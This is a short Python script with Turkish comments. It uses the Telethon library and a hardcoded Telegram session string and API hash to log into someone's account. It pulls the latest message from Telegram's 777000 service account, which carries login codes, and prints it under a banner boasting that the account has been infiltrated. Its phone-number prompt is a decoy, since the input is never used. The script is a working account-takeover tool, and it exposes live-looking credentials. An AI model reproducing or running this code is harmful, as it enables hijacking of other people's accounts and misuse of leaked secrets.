from telethon.sync import TelegramClient, events
from telethon.sessions import StringSession

import time

# Bu senin asistan hesabının string session'ı (önceden alınmış olmalı)


from telethon.sync import TelegramClient
from telethon.sessions import StringSession

# Gerekli bilgiler
api_id = 25512251  # my.telegram.org'dan al
api_hash = "86cf5ff56e56c4f20a7b1295b130e720"

string_session = "1BJWap1sBu1908Xp9OWTrbuzwR2Z6WmwMsrxqvyW--cuM7C5fR7wYH1SyWqUEReIENds6Cf8BeyWZ7tc7YLnKK9kyrxto_d5ds1_jTCOtmWyOZPuH1MZgVis13sQmgFwEKv7PGLTydoRyxXQ-ojfKX4S87tIraHxZgxsas-GOAVIslKsRRkfa3H2BVLGYG9V194YMJbWQTxs7_1VVTfSuQ7slbjg5cEjVIeaAV0XYtorr7o7nTe-O9A8iG8SuYh5M8z5vOaBXipeWUtmwigxoOJxnW3__kqGkIAhJ84Tdv0VAhXrz_mqf2gadGMZLMhNpswB1P_UbWSHa9YDu2Uk6gxpzFpMRzJM="

input("📱 Telefon numaranızı girin (opsiyonel): ")

# Telegram istemcisi başlat
with TelegramClient(StringSession(string_session), api_id, api_hash) as client:
    # 777000 Telegram sistem hesabından gelen son mesajı al
    messages = client.get_messages(777000, limit=1)

    if messages:
        print("\n📨 Mükemmel hesaba sızıldı işte giriş yapman için gereken kod:")
        print("────────────────────────────")
        print(messages[0].text)
        print("────────────────────────────")
    else:
        print("❌ 777000'dan hiç mesaj alınamadı.")
